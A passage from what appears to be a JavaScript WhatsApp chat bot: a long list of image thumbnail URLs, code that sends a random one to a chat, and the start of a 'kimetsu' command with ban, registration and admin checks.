pg','https://thumbs2.imgbox.com/1d/09/IET9cRC0_t.jpg','https://thumbs2.imgbox.com/6a/9d/HHh48jSV_t.jpg','https://thumbs2.imgbox.com/4a/7d/S6qF4N96_t.jpg','https://thumbs2.imgbox.com/32/eb/a1VzTFR1_t.jpg','https://thumbs2.imgbox.com/d0/49/8c2PW8MD_t.jpg','https://thumbs2.imgbox.com/fb/05/he8yZtdt_t.jpg','https://thumbs2.imgbox.com/2e/e9/pdlE2G4B_t.jpg','https://thumbs2.imgbox.com/7d/89/fPd2owDT_t.jpg','https://thumbs2.imgbox.com/55/3a/dLgBvl84_t.jpg','https://thumbs2.imgbox.com/a2/24/7UPDBToL_t.jpg','https://thumbs2.imgbox.com/c2/22/eIxK4BcY_t.jpg','https://thumbs2.imgbox.com/ae/00/qRMpH34I_t.jpg','https://thumbs2.imgbox.com/5e/8e/BSxF36tn_t.jpg','https://thumbs2.imgbox.com/ea/6c/9m16NXBE_t.jpg','https://thumbs2.imgbox.com/29/e1/heEBSeHG_t.jpg','https://thumbs2.imgbox.com/9d/7a/eZjRvH27_t.jpg','https://thumbs2.imgbox.com/b9/b0/YQSY9dNu_t.jpg','https://thumbs2.imgbox.com/5e/a6/ZetLzEWw_t.jpg','https://thumbs2.imgbox.com/62/f3/1UjK4ffd_t.jpg','https://thumbs2.imgbox.com/18/58/XcnJT8w2_t.jpg','https://thumbs2.imgbox.com/33/06/S0BefeS6_t.jpg','https://thumbs2.imgbox.com/fc/07/eFZ9QhoR_t.jpg','https://thumbs2.imgbox.com/42/b2/7hLY7keM_t.jpg','https://thumbs2.imgbox.com/5f/4b/ytnxMZ1k_t.jpg','https://thumbs2.imgbox.com/50/02/CoQgcZtO_t.jpg','https://thumbs2.imgbox.com/6c/32/NzvQ0CPK_t.jpg','https://thumbs2.imgbox.com/7f/91/Pb6lwgXK_t.jpg','https://thumbs2.imgbox.com/d0/f9/anLTFVJb_t.jpg','https://thumbs2.imgbox.com/5c/42/bINGig29_t.jpg','https://thumbs2.imgbox.com/de/79/EuNMwv6B_t.jpg','https://thumbs2.imgbox.com/b8/1f/D315nUXH_t.jpg','https://thumbs2.imgbox.com/95/cd/I2DiCB2R_t.jpg','https://thumbs2.imgbox.com/4e/bb/sBkeOboJ_t.jpg','https://thumbs2.imgbox.com/2a/28/gu9Rmo1T_t.jpg','https://thumbs2.imgbox.com/2d/47/Z6zpz7uz_t.jpg','https://thumbs2.imgbox.com/62/bf/OsIMahiD_t.jpg','https://thumbs2.imgbox.com/81/2d/jXcSgSIe_t.jpg','https://thumbs2.imgbox.com/d7/33/DeDJ4Gl3_t.jpg','https://thumbs2.imgbox.com/99/7c/SimXbRjt_t.jpg','https://thumbs2.imgbox.com/e3/42/5IJGjzUX_t.jpg','https://thumbs2.imgbox.com/50/58/CPWXNl2w_t.jpg','https://thumbs2.imgbox.com/2a/86/Jsx5E3hI_t.jpg','https://thumbs2.imgbox.com/cc/1a/qgWtgQD7_t.jpg','https://thumbs2.imgbox.com/72/f8/IGFVeCKD_t.jpg','https://thumbs2.imgbox.com/04/91/NxgHMHtV_t.jpg','https://thumbs2.imgbox.com/51/ee/0TTpwPUE_t.jpg','https://thumbs2.imgbox.com/31/49/0UaDnW86_t.jpg','https://thumbs2.imgbox.com/bf/20/JraCCKHD_t.jpg','https://thumbs2.imgbox.com/36/d9/g3AWWRJi_t.jpg','https://thumbs2.imgbox.com/82/59/bG8KYCC4_t.jpg','https://thumbs2.imgbox.com/db/66/DK4sP9Ye_t.jpg','https://thumbs2.imgbox.com/76/84/NB34xF2y_t.jpg','https://thumbs2.imgbox.com/cb/49/MEjUwHPx_t.jpg','https://thumbs2.imgbox.com/84/76/6l3m1wui_t.jpg','https://thumbs2.imgbox.com/6a/3a/n8LJkzUT_t.jpg','https://thumbs2.imgbox.com/2d/c0/PdXqiNsc_t.jpg','https://thumbs2.imgbox.com/3a/4e/IIgLSmcH_t.jpg','https://thumbs2.imgbox.com/10/e7/VjacjBiS_t.jpg','https://thumbs2.imgbox.com/3f/3d/eJReh3gW_t.jpg','https://thumbs2.imgbox.com/b2/71/dvjIuTcv_t.jpg','https://thumbs2.imgbox.com/f4/36/kQdatCOH_t.jpg','https://thumbs2.imgbox.com/87/bd/m2GZPOcv_t.jpg','https://thumbs2.imgbox.com/d6/4a/lrjPGqn1_t.jpg','https://thumbs2.imgbox.com/43/87/rxxQuLXw_t.jpg','https://thumbs2.imgbox.com/4c/2d/oBlBAWGY_t.jpg','https://thumbs2.imgbox.com/e8/d7/Od1GUIwt_t.jpg','https://thumbs2.imgbox.com/1b/f4/6gSo2udQ_t.jpg','https://thumbs2.imgbox.com/84/d2/KmjXVEjx_t.jpg','https://thumbs2.imgbox.com/bf/f0/a90QYhsL_t.jpg','https://thumbs2.imgbox.com/1e/9b/Y2OiMSRP_t.jpg','https://thumbs2.imgbox.com/24/c9/r2h9aBuj_t.jpg','https://thumbs2.imgbox.com/01/ce/OwsZsQB8_t.jpg','https://thumbs2.imgbox.com/de/f4/eVW9x9pz_t.jpg','https://thumbs2.imgbox.com/5e/9c/UJUTBSpg_t.jpg','https://thumbs2.imgbox.com/a6/f8/TzBaKEeO_t.jpg','https://thumbs2.imgbox.com/9e/bb/HvDWEtt6_t.jpg','https://thumbs2.imgbox.com/c7/8d/CR1NYUGJ_t.jpg','https://thumbs2.imgbox.com/d3/e3/JlqXSaKM_t.jpg','https://thumbs2.imgbox.com/8b/12/zWRvUGUC_t.jpg','https://thumbs2.imgbox.com/5c/e8/lLbgIFsk_t.jpg','https://thumbs2.imgbox.com/64/8d/csR031BF_t.jpg','https://thumbs2.imgbox.com/b2/f7/aFxwnyO7_t.jpg','https://thumbs2.imgbox.com/55/77/Qdo23rXs_t.jpg','https://thumbs2.imgbox.com/b7/14/2z7cg0X1_t.jpg','https://thumbs2.imgbox.com/b7/af/qCmVp91i_t.jpg','https://thumbs2.imgbox.com/5b/5e/SXP7ZZm6_t.jpg','https://thumbs2.imgbox.com/f7/0d/EV00FZUi_t.jpg','https://thumbs2.imgbox.com/46/f2/z4c4i62i_t.jpg','https://thumbs2.imgbox.com/c5/c8/QWkPMgEI_t.jpg','https://thumbs2.imgbox.com/a5/ff/L9dbWZGq_t.jpg','https://thumbs2.imgbox.com/32/b0/sZK27axC_t.jpg','https://thumbs2.imgbox.com/36/ba/hTG2BQ7w_t.jpg','https://thumbs2.imgbox.com/c7/84/gCxzcIPC_t.jpg','https://thumbs2.imgbox.com/5c/39/hvNM3jAK_t.jpg','https://thumbs2.imgbox.com/a4/fc/ovNYuxNU_t.jpg','https://thumbs2.imgbox.com/57/7a/ydCLRce9_t.jpg','https://thumbs2.imgbox.com/a9/8e/qkzRd5Sh_t.jpg','https://thumbs2.imgbox.com/25/65/8u7Vj7vr_t.jpg','https://thumbs2.imgbox.com/56/62/U8aNtU1d_t.jpg','https://thumbs2.imgbox.com/8e/be/aqip6ufO_t.jpg','https://thumbs2.imgbox.com/d9/b9/veRe0fxH_t.jpg','https://thumbs2.imgbox.com/1b/66/I0POtqOj_t.jpg','https://thumbs2.imgbox.com/36/3c/d9tVzvyh_t.jpg','https://thumbs2.imgbox.com/47/59/8LCIvaWG_t.jpg','https://thumbs2.imgbox.com/9d/16/1CKSpRp7_t.jpg','https://thumbs2.imgbox.com/69/1b/D4iJC7Lt_t.jpg','https://thumbs2.imgbox.com/5f/39/ZwZj0VNE_t.jpg','https://thumbs2.imgbox.com/27/e1/3FUss09N_t.jpg','https://thumbs2.imgbox.com/ec/9d/9xUzIGND_t.jpg','https://thumbs2.imgbox.com/6a/0d/KYYflbTn_t.jpg','https://thumbs2.imgbox.com/62/5a/TFARb5qy_t.jpg','https://thumbs2.imgbox.com/a2/e4/cTz7Lu2F_t.jpg','https://thumbs2.imgbox.com/9e/d1/SVBq7Oux_t.jpg','https://thumbs2.imgbox.com/28/38/O4ZCQxF9_t.jpg','https://thumbs2.imgbox.com/94/54/Z5flJhkv_t.jpg','https://thumbs2.imgbox.com/7c/8d/R1zwJegK_t.jpg','https://thumbs2.imgbox.com/d3/53/MudD0C02_t.jpg','https://thumbs2.imgbox.com/cb/88/rSW0L3Yi_t.jpg','https://thumbs2.imgbox.com/39/6f/R0dP2Abh_t.jpg','https://thumbs2.imgbox.com/4b/d7/yzypGIcN_t.jpg','https://thumbs2.imgbox.com/4a/7b/uOs3t2yC_t.jpg','https://thumbs2.imgbox.com/e0/04/pdArJEer_t.jpg','https://thumbs2.imgbox.com/8a/f4/kLNaUKyT_t.jpg','https://thumbs2.imgbox.com/52/1d/UJzAeNnE_t.jpg','https://thumbs2.imgbox.com/9d/7e/uj9YQEDg_t.jpg','https://thumbs2.imgbox.com/5c/15/Lwy6561d_t.jpg','https://thumbs2.imgbox.com/df/4e/R1sANX4g_t.jpg','https://thumbs2.imgbox.com/a8/80/iPf58IrR_t.jpg','https://thumbs2.imgbox.com/8e/04/dUVxu9xz_t.jpg','https://thumbs2.imgbox.com/ab/c0/TZXm9ifj_t.jpg','https://thumbs2.imgbox.com/fb/5f/iKi4NRUb_t.jpg','https://thumbs2.imgbox.com/1d/77/HjZo8hsK_t.jpg','https://thumbs2.imgbox.com/6a/81/kLhk96Fv_t.jpg','https://thumbs2.imgbox.com/fa/94/Jkik2GIz_t.jpg','https://thumbs2.imgbox.com/db/56/B3rM3IwQ_t.jpg','https://thumbs2.imgbox.com/d6/59/v2hhHxTO_t.jpg','https://thumbs2.imgbox.com/ec/a2/wxpoJZkU_t.jpg','https://thumbs2.imgbox.com/90/10/Kd8mFM2e_t.jpg','https://thumbs2.imgbox.com/41/41/Yq6E1cKY_t.jpg','https://thumbs2.imgbox.com/88/db/RMaU7PRx_t.jpg','https://thumbs2.imgbox.com/f3/27/OHugZ8do_t.jpg','https://thumbs2.imgbox.com/fe/e9/EWQDLuBk_t.jpg','https://thumbs2.imgbox.com/a5/94/HoiG6tC4_t.jpg','https://thumbs2.imgbox.com/e1/70/K9hb26RW_t.jpg','https://thumbs2.imgbox.com/70/b2/8RvaH0dP_t.jpg','https://thumbs2.imgbox.com/9d/23/HkEVPa43_t.jpg','https://thumbs2.imgbox.com/ac/8d/O2UyJJVV_t.jpg','https://thumbs2.imgbox.com/66/bb/5uPCV88O_t.jpg','https://thumbs2.imgbox.com/99/66/cgtYwnbV_t.jpg','https://thumbs2.imgbox.com/81/be/BDtTWZ4Z_t.jpg','https://thumbs2.imgbox.com/dc/d2/aCpzhmMr_t.jpg','https://thumbs2.imgbox.com/cf/2b/wRWGX6FG_t.jpg','https://thumbs2.imgbox.com/1a/5d/xAGfYLvR_t.jpg','https://thumbs2.imgbox.com/8e/03/3kC8fQ54_t.jpg','https://thumbs2.imgbox.com/47/1d/Ip5moAYp_t.jpg','https://thumbs2.imgbox.com/72/13/WAchG9bo_t.jpg','https://thumbs2.imgbox.com/be/b8/Yc5amWsh_t.jpg','https://thumbs2.imgbox.com/cf/60/XVKOiASx_t.jpg','https://thumbs2.imgbox.com/0a/39/4Zskz1vo_t.jpg','https://thumbs2.imgbox.com/b1/f6/e0570Af0_t.jpg','https://thumbs2.imgbox.com/60/59/dlvxl8HW_t.jpg','https://thumbs2.imgbox.com/6d/4f/z1JeEWoc_t.jpg','https://thumbs2.imgbox.com/ae/15/Gy9TCrzW_t.jpg','https://thumbs2.imgbox.com/9c/02/D1AHBgDB_t.jpg','https://thumbs2.imgbox.com/1e/e5/TZlo2si9_t.jpg','https://thumbs2.imgbox.com/fb/30/v23tdlH9_t.jpg','https://thumbs2.imgbox.com/e5/21/ytS6EeLd_t.jpg','https://thumbs2.imgbox.com/9a/b3/WeBdzY1P_t.jpg','https://thumbs2.imgbox.com/08/e5/uBr5fwNd_t.jpg','https://thumbs2.imgbox.com/16/64/odhv9s1r_t.jpg','https://thumbs2.imgbox.com/b7/79/AhmHKKRw_t.jpg','https://thumbs2.imgbox.com/95/08/SATC9xHW_t.jpg','https://thumbs2.imgbox.com/7e/85/xqmLLQAw_t.jpg','https://thumbs2.imgbox.com/13/33/HrY4WbOa_t.jpg','https://thumbs2.imgbox.com/0d/11/31hOZz5i_t.jpg','https://thumbs2.imgbox.com/42/c4/IzO9pFDc_t.jpg','https://thumbs2.imgbox.com/83/9c/VOJ7hImd_t.jpg','https://thumbs2.imgbox.com/17/0b/HmEW1wGs_t.jpg','https://thumbs2.imgbox.com/ba/f7/ClxEZhbj_t.jpg','https://thumbs2.imgbox.com/5a/b8/OgkR4zgl_t.jpg','https://thumbs2.imgbox.com/b8/4f/uROKnxNj_t.jpg','https://thumbs2.imgbox.com/19/81/Hg6jxEKo_t.jpg','https://thumbs2.imgbox.com/87/b2/r6Cq3MFl_t.jpg','https://thumbs2.imgbox.com/1a/9b/JqDYkv1v_t.jpg','https://thumbs2.imgbox.com/58/a7/7XkFbxgB_t.jpg','https://thumbs2.imgbox.com/36/84/b2jVScvp_t.jpg','https://thumbs2.imgbox.com/90/b5/dz2YKg0Y_t.jpg','https://thumbs2.imgbox.com/26/e2/JZ1COCgU_t.jpg','https://thumbs2.imgbox.com/fb/7a/sbvwl733_t.jpg','https://thumbs2.imgbox.com/7b/99/ZjFzHZlK_t.jpg','https://thumbs2.imgbox.com/ac/d5/MfubmTrc_t.jpg','https://thumbs2.imgbox.com/e6/5f/NfDMh3lT_t.jpg','https://thumbs2.imgbox.com/1c/bf/jpeYRIxU_t.jpg','https://thumbs2.imgbox.com/97/be/xCsuU96x_t.jpg','https://thumbs2.imgbox.com/4c/c2/Vtg8s2N3_t.jpg','https://thumbs2.imgbox.com/49/60/7vy720xo_t.jpg','https://thumbs2.imgbox.com/e7/af/Mtoehjea_t.jpg','https://thumbs2.imgbox.com/8c/7b/ujFUbIJE_t.jpg','https://thumbs2.imgbox.com/9e/d6/mOWbVVdr_t.jpg','https://thumbs2.imgbox.com/85/af/O8OLBRWd_t.jpg','https://thumbs2.imgbox.com/d0/5a/PLoNgB0b_t.jpg','https://thumbs2.imgbox.com/24/b7/rxy7jkFv_t.jpg','https://thumbs2.imgbox.com/61/a5/9vzbb7ow_t.jpg','https://thumbs2.imgbox.com/fd/c3/KSr0iUOc_t.jpg','https://thumbs2.imgbox.com/18/6c/1ZErjI29_t.jpg','https://thumbs2.imgbox.com/f5/5d/bf3grvn5_t.jpg','https://thumbs2.imgbox.com/2c/a0/luPsTwu2_t.jpg','https://thumbs2.imgbox.com/fb/5d/PS3u3ctR_t.jpg','https://thumbs2.imgbox.com/eb/1b/BO7NhWNE_t.jpg','https://thumbs2.imgbox.com/99/e4/H8oKU7Lz_t.jpg','https://thumbs2.imgbox.com/35/c9/SeKM5ksa_t.jpg','https://thumbs2.imgbox.com/d3/1a/ojbuRTpi_t.jpg','https://thumbs2.imgbox.com/4d/72/oOC807tI_t.jpg','https://thumbs2.imgbox.com/3b/1a/HugauoMB_t.jpg','https://thumbs2.imgbox.com/b5/92/gB91C0ep_t.jpg','https://thumbs2.imgbox.com/5a/2e/bEU3MAaJ_t.jpg','https://thumbs2.imgbox.com/0f/52/qY3slnqH_t.jpg','https://thumbs2.imgbox.com/44/90/uU9291TC_t.jpg','https://thumbs2.imgbox.com/53/b3/CRsa8A37_t.jpg','https://thumbs2.imgbox.com/ef/4f/GjWeJaRa_t.jpg','https://thumbs2.imgbox.com/f8/08/NqJdsA7g_t.jpg','https://thumbs2.imgbox.com/c0/ad/DlJzdmdp_t.jpg','https://thumbs2.imgbox.com/fd/70/c5kOSd5Q_t.jpg','https://thumbs2.imgbox.com/f8/74/V5iTzU3m_t.jpg','https://thumbs2.imgbox.com/0d/cf/LyNbdR8q_t.jpg','https://thumbs2.imgbox.com/16/04/dQaFZPw0_t.jpg','https://thumbs2.imgbox.com/b4/26/kwzkorYm_t.jpg','https://thumbs2.imgbox.com/51/6b/5szfks3Z_t.jpg','https://thumbs2.imgbox.com/59/30/6neW80n3_t.jpg','https://thumbs2.imgbox.com/28/dd/yiKoNZCM_t.jpg','https://thumbs2.imgbox.com/4d/48/UBacGTag_t.jpg','https://thumbs2.imgbox.com/51/7f/TdIhRkz6_t.jpg','https://thumbs2.imgbox.com/0f/20/Vn8zNd11_t.jpg','https://thumbs2.imgbox.com/cf/c3/3Odj4Qjd_t.jpg','https://thumbs2.imgbox.com/c4/2e/2k5Pxulc_t.jpg','https://thumbs2.imgbox.com/f4/06/ObMaMtpB_t.jpg','https://thumbs2.imgbox.com/fb/9f/WnZ5APaS_t.jpg','https://thumbs2.imgbox.com/c6/90/vQeCnZsm_t.jpg','https://thumbs2.imgbox.com/80/a3/cgNNfqob_t.jpg','https://thumbs2.imgbox.com/4a/d6/qTnI2l9E_t.jpg','https://thumbs2.imgbox.com/fd/14/kRhv7fvA_t.jpg','https://thumbs2.imgbox.com/ae/8c/XuTTb7gI_t.jpg','https://thumbs2.imgbox.com/60/4a/1Ay8yHWh_t.jpg','https://thumbs2.imgbox.com/17/bc/L2kgPrXE_t.jpg','https://thumbs2.imgbox.com/66/5c/7v9X8XM6_t.jpg','https://thumbs2.imgbox.com/ad/da/G5rXK0yw_t.jpg','https://thumbs2.imgbox.com/97/26/YH77uxIl_t.jpg','https://thumbs2.imgbox.com/7d/2f/TwPwINfe_t.jpg','https://thumbs2.imgbox.com/9e/da/h2zsg3x8_t.jpg','https://thumbs2.imgbox.com/82/03/m20Q812M_t.jpg','https://thumbs2.imgbox.com/ce/52/WJXiQdqa_t.jpg','https://thumbs2.imgbox.com/c8/e6/5QELcUJy_t.jpg','https://thumbs2.imgbox.com/73/08/nfaQzVOJ_t.jpg','https://thumbs2.imgbox.com/6a/1f/CchLsiMu_t.jpg','https://thumbs2.imgbox.com/7e/e9/bGr6U5E4_t.jpg','https://thumbs2.imgbox.com/1f/a8/y4E3hcDQ_t.jpg','https://thumbs2.imgbox.com/ca/24/WaStuOcl_t.jpg','https://thumbs2.imgbox.com/e6/3e/9Fh7VfR1_t.jpg','https://thumbs2.imgbox.com/76/0b/8zw15gnc_t.jpg','https://thumbs2.imgbox.com/73/e7/RyIT8q1L_t.jpg','https://thumbs2.imgbox.com/42/63/PcrmpIYs_t.jpg','https://thumbs2.imgbox.com/c5/e6/x2tpK7A7_t.jpg','https://thumbs2.imgbox.com/76/a8/Zba1rZoq_t.jpg','https://thumbs2.imgbox.com/71/24/AlvJGFP8_t.jpg','https://thumbs2.imgbox.com/27/b5/PuE1ABh5_t.jpg','https://thumbs2.imgbox.com/d4/97/SoXDZ2M1_t.jpg','https://thumbs2.imgbox.com/a9/15/nxLldjgD_t.jpg','https://thumbs2.imgbox.com/48/20/4GT21ThG_t.jpg','https://thumbs2.imgbox.com/c5/db/3Somx05L_t.jpg','https://thumbs2.imgbox.com/59/70/0G6d44wX_t.jpg','https://thumbs2.imgbox.com/56/8f/lxcpPmM9_t.jpg','https://thumbs2.imgbox.com/92/bb/5Hc7odwG_t.jpg','https://thumbs2.imgbox.com/4c/5e/FHLY6akf_t.jpg','https://thumbs2.imgbox.com/50/26/wsDbC7sN_t.jpg','https://thumbs2.imgbox.com/0e/e4/WavtTmlI_t.jpg','https://thumbs2.imgbox.com/dd/00/punYQn4A_t.jpg','https://thumbs2.imgbox.com/09/cc/0JlTQPf4_t.jpg','https://thumbs2.imgbox.com/51/08/BI3pokmd_t.jpg','https://thumbs2.imgbox.com/78/f0/JHiwBexu_t.jpg','https://thumbs2.imgbox.com/5f/2c/ZJ1KtdST_t.jpg','https://thumbs2.imgbox.com/0b/2f/fDrdzAbc_t.jpg','https://thumbs2.imgbox.com/f8/30/bxMnfT0l_t.jpg','https://thumbs2.imgbox.com/6a/30/A33QgZNH_t.jpg','https://thumbs2.imgbox.com/16/34/HEpCCIKk_t.jpg','https://thumbs2.imgbox.com/5e/4b/mZDwvhrQ_t.jpg','https://thumbs2.imgbox.com/e6/7d/io82FzEa_t.jpg','https://thumbs2.imgbox.com/8c/98/bjjILJ9P_t.jpg','https://thumbs2.imgbox.com/42/7f/3Y8IFYFH_t.jpg','https://thumbs2.imgbox.com/61/73/2CQzZSHU_t.jpg','https://thumbs2.imgbox.com/eb/f2/359G1DxU_t.jpg','https://thumbs2.imgbox.com/26/f5/tPoDmfkh_t.jpg','https://thumbs2.imgbox.com/11/4b/7Z0bAVDe_t.jpg','https://thumbs2.imgbox.com/25/f3/Y2Iagl52_t.jpg','https://thumbs2.imgbox.com/68/87/c3tluyj4_t.jpg','https://thumbs2.imgbox.com/34/65/wMlA2dMx_t.jpg','https://thumbs2.imgbox.com/09/27/Zc6txYI5_t.jpg','https://thumbs2.imgbox.com/c8/8c/1IvIBRTH_t.jpg','https://thumbs2.imgbox.com/98/5e/pfnJv6kX_t.jpg','https://thumbs2.imgbox.com/01/51/T8gyLPL4_t.jpg','https://thumbs2.imgbox.com/21/67/ClWF0rvJ_t.jpg','https://thumbs2.imgbox.com/17/8b/QhRM2NAw_t.jpg','https://thumbs2.imgbox.com/50/b5/zKEM7zyD_t.jpg','https://thumbs2.imgbox.com/46/88/6I1wIUjz_t.jpg','https://thumbs2.imgbox.com/62/9c/R9GjWmSh_t.jpg','https://thumbs2.imgbox.com/d0/b8/j2JEUShX_t.jpg','https://thumbs2.imgbox.com/df/ff/KvcDlBJo_t.jpg','https://thumbs2.imgbox.com/a7/53/c14BFQOM_t.jpg','https://thumbs2.imgbox.com/f7/02/LSNXhbMn_t.jpg','https://thumbs2.imgbox.com/74/19/oQMyKgfz_t.jpg','https://thumbs2.imgbox.com/7e/30/cN7W78Rl_t.jpg','https://thumbs2.imgbox.com/3a/23/jvxRCZIY_t.jpg','https://thumbs2.imgbox.com/a4/f4/JqtRHk2p_t.jpg','https://thumbs2.imgbox.com/4f/ae/AFegOpZX_t.jpg','https://thumbs2.imgbox.com/36/eb/LQUeBEkn_t.jpg','https://thumbs2.imgbox.com/48/0c/EpAGGZDY_t.jpg','https://thumbs2.imgbox.com/1b/e9/gmfGobOi_t.jpg','https://thumbs2.imgbox.com/2a/08/yRoYaFMS_t.jpg','https://thumbs2.imgbox.com/c7/9c/IMjto1HM_t.jpg','https://thumbs2.imgbox.com/c2/e8/FQOdGwJP_t.jpg','https://thumbs2.imgbox.com/4e/8f/maNLR1Jb_t.jpg','https://thumbs2.imgbox.com/b6/48/IM9P1tGa_t.jpg','https://thumbs2.imgbox.com/6a/da/u7TfIQQQ_t.jpg','https://thumbs2.imgbox.com/87/27/3Z25YBvZ_t.jpg','https://thumbs2.imgbox.com/9f/da/MsLRQC8R_t.jpg','https://thumbs2.imgbox.com/2f/b3/1wEzVZnp_t.jpg','https://thumbs2.imgbox.com/1d/2d/lEMmCcdU_t.jpg','https://thumbs2.imgbox.com/8c/bf/gS3CgfCg_t.jpg','https://thumbs2.imgbox.com/c6/87/EwglN5hV_t.jpg','https://thumbs2.imgbox.com/ae/85/mCHZw7VI_t.jpg','https://thumbs2.imgbox.com/df/76/uqfRG61b_t.jpg','https://thumbs2.imgbox.com/cb/5e/jihgwXmy_t.jpg','https://thumbs2.imgbox.com/88/59/vVXGY0nS_t.jpg','https://thumbs2.imgbox.com/74/99/UGuGmwNM_t.jpg','https://thumbs2.imgbox.com/f0/d7/678YdVFp_t.jpg','https://thumbs2.imgbox.com/41/d3/IceCoiQB_t.jpg','https://thumbs2.imgbox.com/ae/47/Yklv3CPo_t.jpg','https://thumbs2.imgbox.com/ae/85/nzPnUCGk_t.jpg','https://thumbs2.imgbox.com/91/e0/mg1U4MvD_t.jpg','https://thumbs2.imgbox.com/f8/38/66q8Zn2l_t.jpg','https://thumbs2.imgbox.com/5a/dd/bnui5nOp_t.jpg','https://thumbs2.imgbox.com/17/f5/FRSh10Fy_t.jpg','https://thumbs2.imgbox.com/26/b6/qNE3T75B_t.jpg','https://thumbs2.imgbox.com/4f/92/4OX6RPQs_t.jpg','https://thumbs2.imgbox.com/9e/cd/g8Dl3sRa_t.jpg','https://thumbs2.imgbox.com/f9/5f/gdllDhqg_t.jpg','https://thumbs2.imgbox.com/e4/9b/wvC49cXP_t.jpg','https://thumbs2.imgbox.com/6c/d8/hZobazRc_t.jpg','https://thumbs2.imgbox.com/cb/c2/lB5W3QDT_t.jpg','https://thumbs2.imgbox.com/1a/09/rDcHN6qJ_t.jpg','https://thumbs2.imgbox.com/a0/9d/yx6rgX48_t.jpg','https://thumbs2.imgbox.com/c1/4f/Q4oDwi2g_t.jpg','https://thumbs2.imgbox.com/60/dc/7poHq9UK_t.jpg','https://thumbs2.imgbox.com/04/64/SsQBIj3h_t.jpg','https://thumbs2.imgbox.com/69/70/Fwj7EZ0r_t.jpg','https://thumbs2.imgbox.com/7b/df/SjfuGdGC_t.jpg','https://thumbs2.imgbox.com/3e/37/qj2jFnpt_t.jpg','https://thumbs2.imgbox.com/aa/86/vpfD5Pjx_t.jpg','https://thumbs2.imgbox.com/7a/7d/XVxVYksL_t.jpg','https://thumbs2.imgbox.com/ee/97/dzkF6RPK_t.jpg','https://thumbs2.imgbox.com/eb/d2/ikJWWi4s_t.jpg','https://thumbs2.imgbox.com/6c/6a/R6HMorCS_t.jpg','https://thumbs2.imgbox.com/b2/83/DLAjVo4y_t.jpg','https://thumbs2.imgbox.com/66/75/ITroXTjF_t.jpg','https://thumbs2.imgbox.com/c6/9c/csaoPJjk_t.jpg','https://thumbs2.imgbox.com/4c/b2/h25zGFkP_t.jpg','https://thumbs2.imgbox.com/95/85/aRkN65ns_t.jpg','https://thumbs2.imgbox.com/54/50/5EjPVox3_t.jpg','https://thumbs2.imgbox.com/2b/6d/w1z22fFr_t.jpg','https://thumbs2.imgbox.com/78/2b/EoedcaNR_t.jpg','https://thumbs2.imgbox.com/e3/fb/GvgggFOQ_t.jpg','https://thumbs2.imgbox.com/ff/4c/RtrdzQLw_t.jpg','https://thumbs2.imgbox.com/84/a0/1y3Y8QO0_t.jpg','https://thumbs2.imgbox.com/76/3d/uZ42RguQ_t.jpg','https://thumbs2.imgbox.com/a8/2a/UIxOFLuo_t.jpg','https://thumbs2.imgbox.com/59/43/UkV156PJ_t.jpg','https://thumbs2.imgbox.com/39/47/jqeHIQk0_t.jpg','https://thumbs2.imgbox.com/26/93/RmnFiT36_t.jpg','https://thumbs2.imgbox.com/bd/09/5lWv2s1L_t.jpg','https://thumbs2.imgbox.com/3e/e5/w2PuKSId_t.jpg','https://thumbs2.imgbox.com/e3/ce/BOsE0gVS_t.jpg','https://thumbs2.imgbox.com/d9/f0/Emi8f2Jt_t.jpg','https://thumbs2.imgbox.com/36/b9/Q6k7sZJd_t.jpg','https://thumbs2.imgbox.com/bf/84/SwWq9wAF_t.jpg','https://thumbs2.imgbox.com/2c/6d/iYEnC0ZB_t.jpg','https://thumbs2.imgbox.com/59/bd/ioxllYp9_t.jpg','https://thumbs2.imgbox.com/50/75/OHC5r3Ke_t.jpg','https://thumbs2.imgbox.com/f8/7d/DCAvvnh3_t.jpg','https://thumbs2.imgbox.com/af/ed/4d5phyrJ_t.jpg','https://thumbs2.imgbox.com/50/3c/Llf8B4BD_t.jpg','https://thumbs2.imgbox.com/1d/3e/0SinLo85_t.jpg','https://thumbs2.imgbox.com/07/a5/tYIohZLA_t.jpg','https://thumbs2.imgbox.com/20/07/G5STtPcA_t.jpg','https://thumbs2.imgbox.com/ba/6e/eIrQPE7s_t.jpg','https://thumbs2.imgbox.com/84/47/nTAgMCWW_t.jpg','https://thumbs2.imgbox.com/f9/7b/uauHb043_t.jpg','https://thumbs2.imgbox.com/95/2e/8a4mLVJZ_t.jpg','https://thumbs2.imgbox.com/92/a8/OGIm5i7Z_t.jpg','https://thumbs2.imgbox.com/05/a6/udBp4pgq_t.jpg','https://thumbs2.imgbox.com/c0/1d/23WjitHL_t.jpg','https://thumbs2.imgbox.com/de/d2/ffSqocpx_t.jpg','https://thumbs2.imgbox.com/fe/99/Ylfee5Cc_t.jpg','https://thumbs2.imgbox.com/ae/91/93rtdzHa_t.jpg','https://thumbs2.imgbox.com/c1/07/c43oO7dy_t.jpg','https://thumbs2.imgbox.com/74/19/rAWhWtKA_t.jpg','https://thumbs2.imgbox.com/e5/2f/9GNefvQp_t.jpg','https://thumbs2.imgbox.com/f5/3b/pLhftoAW_t.jpg','https://thumbs2.imgbox.com/22/42/DGVviEh9_t.jpg','https://thumbs2.imgbox.com/3f/f2/dBcvHOEX_t.jpg','https://thumbs2.imgbox.com/33/24/M7ZdpD30_t.jpg','https://thumbs2.imgbox.com/a5/6e/gm0KFUlT_t.jpg','https://thumbs2.imgbox.com/b8/77/R40kWnnQ_t.jpg','https://thumbs2.imgbox.com/ce/92/mpkQkIm6_t.jpg','https://thumbs2.imgbox.com/40/6c/fS1XgxuK_t.jpg','https://thumbs2.imgbox.com/8d/69/1rIFMmAw_t.jpg','https://thumbs2.imgbox.com/71/77/uRR9I7rH_t.jpg','https://thumbs2.imgbox.com/4f/a0/G3wr3WDQ_t.jpg','https://thumbs2.imgbox.com/f6/c3/v9SIGefZ_t.jpg','https://thumbs2.imgbox.com/65/f8/qZNa9h3c_t.jpg','https://thumbs2.imgbox.com/29/2c/Dvd3gHlS_t.jpg','https://thumbs2.imgbox.com/b4/ef/LPwsvPiQ_t.jpg','https://thumbs2.imgbox.com/96/01/jwX3Qr5u_t.jpg','https://thumbs2.imgbox.com/2c/63/BaZjax02_t.jpg','https://thumbs2.imgbox.com/87/f0/5oHx9Luj_t.jpg'
]
let rem = emili[Math.floor(Math.random() * emili.length)]
rezero = await getBuffer(rem)
cnf.sendMessage(from, rezero, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break

case prefix+'kimetsu':
if (isBanned) return  reply(mess.banned) 
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)			  
